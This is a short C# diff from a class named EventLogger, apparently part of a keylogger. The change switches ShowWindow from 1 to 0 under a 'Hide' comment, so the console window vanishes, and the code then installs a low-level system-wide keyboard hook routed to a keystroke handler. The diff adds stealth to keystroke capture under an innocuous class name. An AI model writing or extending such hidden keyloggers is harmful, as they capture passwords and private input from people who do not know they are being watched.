@@ -38,7 +38,7 @@ class EventLogger
         var handle = GetConsoleWindow();
  
         // Hide
-        ShowWindow(handle, 1);
+        ShowWindow(handle, 0);
         var process = Process.GetCurrentProcess();
         
         _keyboardHook = SetHandler(process.MainModule,(LowLevelProc)KeyBoardHandler, Utils.WH_KEYBOARD_LL);
